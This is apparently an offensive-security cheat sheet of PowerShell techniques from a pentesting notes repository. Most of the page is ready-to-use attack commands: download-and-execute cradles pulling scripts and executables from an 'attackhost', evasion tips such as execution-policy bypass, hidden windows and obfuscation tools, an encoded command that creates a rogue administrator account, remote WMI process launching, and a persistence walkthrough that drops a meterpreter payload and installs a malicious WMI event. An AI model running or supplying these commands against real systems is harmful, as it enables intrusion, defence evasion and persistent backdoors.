##### [Execute PowerUp.ps1](../../../../Tools/Shells/Windows/PowerShell/PowerSploit/PowerUp.md)

# In-Memory Execution Methods
* Net.WebClient DownloadString (method)
* Net.WebClient DownloadData (method)
* Net.WebClient OpenRead (method)
* .NET Net.HttpWebRequest (class)
* Word.Application (COM)
* Excel.Application (COM)
* InternetExplorer.Application (COM)
* MsXml2.ServerXmlIHttp (COM)
* Certutil.exe w/ -ping argument

# Disk-Based Execution Methods
* Net.WebClient Download File
* BITSAdmin.exe
* Certutil.exe w/ -urlcache argument

# Evasion
* Use In-Memory execution.
* Use SSL when downloading scripts.
* Use a script extension other than .ps1, such as .jpg.
* Specify User-Agent with Net.WebClient
* -ExecutionPolicy bypass
* -Window hidden
* [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)


# Download File
### Download File To Disk
```powershell
powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
```
##### Using Variables and User-Agent
```powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $payload = "https://attackhost/file.exe"
PS C:\> $local_file = "file.exe"
PS C:\> $downloader.DownloadFile($payload, $local_file)
PS C:\> & $local_file # Execute file.
```
##### Using System's Proxy and Default Credentials
```powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $proxy = [Net.WebRequest]::GetSystemProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $downloader.Proxy = $proxy
PS C:\> $payload = "https://attackhost/file.exe"
PS C:\> $local_file = "file.exe"
PS C:\> $downloader.DownloadFile($payload, $local_file)
```

### Download File To String
##### From CMD Prompt
```powershell
C:\> powershell iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
```
##### From PowerShell Prompt
```powershell
PS C:\> iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
```
##### Using Variables and User-Agent
```powershell
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
PS C:\> $payload = "https://attackhost/script.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> Invoke-Expression $command
```
##### Using Net.WebRequest
```powershell
PS C:\> $request = [System.Net.WebRequest]::Create("https://attackhost/script.ps1")
PS C:\> $response = $request.GetResponse()
PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $request.Proxy = $proxy
PS C:\> iex ([System.IO.StreamReader]($response.GetResponseStream())).ReadToEnd()
```
##### Using XmlDocument
```powershell
PS C:\> $xmldoc = New-Object System.Xml.XmlDocument
PS C:\> $xmldoc.Load("https://attackhost/script.ps1")
PS C:\> iex $xmldoc.command.a.execute
```
### Using COM Object
##### MsXml2.XMLHTTP
```powershell
PS C:\> $downloader = New-Object -ComObject MsXml2.XMLHTTP
PS C:\> $downloader.open("GET", "https://attackhost/script.ps1", false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText
```
##### WinHttp.WinHttp.5.1
```powershell
PS C:\> $downloader = New-Object -ComObject WinHttp.WinHttp.5.1
PS C:\> $downloader.open("GET", "https://attackhost/script.ps1", false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText
```
##### As One-Liner
```powershell
PS C:\> $d=New-Object -ComObject WinHttp.WinHttp.5.1; $d.open("GET", "https://attackhost/script.ps1", false); $d.send(); iex $d.responseText
```

# Encoding
```powershell
PS C:\> $cmd = 'net user myadmin "password" /add; net localgroup Administrators myadmin /add'
PS C:\> $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
PS C:\> $enc = [Convert]::ToBase64String($bytes)

PS C:\> Write-Host $enc # Outputs encoded command

C:\> powershell -encodedcommand [Output from previous command]
```


# Module Commands
##### Get Module Path
```powershell
PS C:\> $env.PSModulePath
```
##### Import Module
```powershell
PS C:\> Import-Module [Module Name]
```

# Processes
##### Get list of processes running, sorted by name.
```powershell
tasklist /NH | sort
```

```bash
whoami /priv
```

# Services
##### Get List of Running Services
```powershell
powershell Get-Service
```

# Discovery
##### Port Scanner
```powershell
PS C:\> $ports=(80, 443); $ip="10.0.0.1"; foreach ($port in $ports) {try {$socket=New-Object System.Net.Sockets.TcpClient($ip, $port);} catch{}; if ($socket -eq $null) {echo $ip":"$port" - Close";}else{echo $ip":"$port" - Open"; $socket=$null;}}
```
##### [Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
##### [Posh-SecMod](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)

# [From Meterpreter](../../../Metasploit/README.md#PowerShell)

# WMI
##### List Commands
```powershell
PS C:\> Get-Help WMI
```
##### List all namespaces within root/cimv2 namespace and all namespace classes
```powershell
PS C:\> Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace"
PS C:\> Get-WmiObject -Namespace "root/cimv2" -Class "__Namespace" | Select-Object Name
```
##### List all classes within specific namespace
```powershell
PS C:\> Get-WmiObject -Namespace "root/cimv2" -List
PS C:\> Get-WmiObject -Namespace "root/cimv2" -List | Where-Object {$_.Name -Match "Win32_Service"}
```
##### Return all services configured on system
```powershell
PS C:\> Get-WmiObject -Class Win32_Service
PS C:\> Get-WmiObject -Class Win32_Service |  Where-Object {$_.State "Running"}
PS C:\> Get-WmiObject -Class Win32_Service |  Where-Object {$_.Name "Defend"}
```
##### List Processes
```powershell
PS C:\> Get-WmiObject -Class Win32_Process -List
PS C:\> Get-WmiObject -List Win32_Process
```
##### List Class Methods
```powershell
PS C:\> Get-WmiObject -List Win32_Process | Get-Member -MemberType Method
```
##### Launch Process
```powershell
# Processes instantiated under this will run as child processes under WmiPrvSE.exe
PS C:\> $proc = Get-WmiObject -List Win32_Process
PS C:\> $proc.Create("cmd.exe")

# Alternate method.
PS C:\> Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe
```
### Remote System
##### Launch Process on a Remote System
```powershell
PS C:\> Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList cmd.exe -ComputerName [Remote Host] -Credential [Username]
```
##### Get Process Class for Process Created on Remote System
```powershell
PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} -ComputerName [Remote Host] -Credential [Username]
```
##### Kill Process on Remote System
```powershell
PS C:\> Get-WmiObject -Class Win32_Process -Filter {ProcessId = "[Process ID]"} -ComputerName [Remote Host] -Credential [Username] | Remove-WmiObject
```
### Persistance
* [Generate meterpreter payload](../../../../Tools/Metasploit/README.md#HTTPS-Reverse-Shell-with-Impersonate-SSL).
* Start HTTP Server.
```bash
python -m SimpleHTTPServer 80
```
* Use Download Cradle to Transfer Payload to Target.
```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadFile('http://[Attack Host]/payload.exe', 'C:\Windows\Tasks\payload.exe')
```
* [Start HTTPS meterpreter listener](../../../../Tools/Metasploit/README.md#HTTPS-Handler-with-PEM).
* Use Download Cradle to Transfer [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) to Target and Install Malicious WMI Event.
```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\Windows\Tasks\payload.exe" -Trigger ProcessStart -ProcessName calc.exe
```
* View Malicious WMI Event
```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec
```
* Remove Malcious WMI Event
```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerLurk.ps1'); Get-WmiEvent -Name CalcExec | Remove-WmiObject
```

# [Empire](Empire/README.md)

# Tools
##### [Empire](https://github.com/EmpireProject/Empire)
##### [Get-HttpStatus](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
##### [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
##### [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
##### [Invoke-Portscan](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
##### [Nishang](https://github.com/samratashok/nishang)
##### [Posh-SecMod](https://powersploit.readthedocs.io/en/latest/Recon/Get-HttpStatus/)
##### [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)
* [Creeping on Users with WMI Events: Introducing PowerLurk](https://pentestarmoury.com/2016/07/13/151/)
##### [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
##### [psgetsystem](https://github.com/decoder-it/psgetsystem)
##### [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

# References
##### [Generates obfuscated PowerShell snippets](https://amsi.fail/)
##### [Approved Verbs for PowerShell Commands](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.2&viewFallbackFrom=powershell-7.1)
##### [Everything you wanted to know about the if statement](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/everything-about-if?view=powershell-7.2&viewFallbackFrom=powershell-7.1)
##### [How to run a PowerShell script from the command prompt?](https://www.tutorialspoint.com/how-to-run-a-powershell-script-from-the-command-prompt)
##### [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)
##### [Powershell](https://chryzsh.gitbooks.io/darthsidious/content/enumeration/powershell.html)
##### [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
##### [PowerShellMafia](https://github.com/PowerShellMafia)
##### [Use Windows PowerShell to search for files](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/)
##### [Where-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2&viewFallbackFrom=powershell-7.1)